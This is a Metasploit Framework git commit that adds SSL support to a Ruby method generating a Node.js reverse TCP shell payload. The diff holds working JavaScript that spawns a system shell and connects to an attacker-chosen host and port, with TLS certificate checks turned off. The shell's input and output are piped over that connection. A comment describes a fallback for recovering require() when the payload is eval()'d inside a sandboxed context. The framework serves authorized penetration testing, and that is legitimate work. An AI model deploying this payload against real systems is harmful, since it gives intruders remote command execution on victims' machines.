c7bcc97dff99f812bc2c13d5d2709788b55b9477
joev <joev@metasploit.com>
2013-10-12 03:32:52 -0500

    Add SSL support to #nodejs_reverse_tcp.

--- lib/msf/core/payload/nodejs.rb
+++ lib/msf/core/payload/nodejs.rb
@@ -28,20 +28,30 @@ module Msf::Payload::NodeJS
   end
 
   # Outputs a javascript snippet that spawns a reverse TCP shell
+  # @param [Hash] opts the options to create the reverse TCP payload with
+  # @option opts [Boolean] :use_ssl use SSL when communicating with the shell. defaults to false.
   # @return [String] javascript code that executes reverse TCP payload
-  def nodejs_reverse_tcp
+  def nodejs_reverse_tcp(opts={})
+    use_ssl = opts.fetch(:use_ssl, false)
+    tls_hash = if use_ssl then '{rejectUnauthorized:false}, ' else '' end
+    net_lib = if use_ssl then 'tls' else 'net' end
     lhost = Rex::Socket.is_ipv6?(lhost) ? "[#{datastore['LHOST']}]" : datastore['LHOST']
+    # the global.process.mainModule.constructor._load fallback for require() is
+    # handy when the payload is eval()'d into a sandboxed context: the reference
+    # to 'require' is missing, but can be looked up from the 'global' object.
+    #
+    # however, this fallback might break in later versions of nodejs.
     cmd = <<-EOS
       (function(){
         var require = global.require || global.process.mainModule.constructor._load;
         if (!require) return;
         var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh";
-        var net = require("net"),
+        var net = require("#{net_lib}"),
             cp = require("child_process"),
             util = require("util"),
             sh = cp.spawn(cmd, []);
         var client = this;
-        client.socket = net.connect(#{datastore['LPORT']}, "#{lhost}", function() {
+        client.socket = net.connect(#{datastore['LPORT']}, "#{lhost}", #{tls_hash} function() {
           client.socket.pipe(sh.stdin);
           util.pump(sh.stdout, client.socket);
           util.pump(sh.stderr, client.socket);
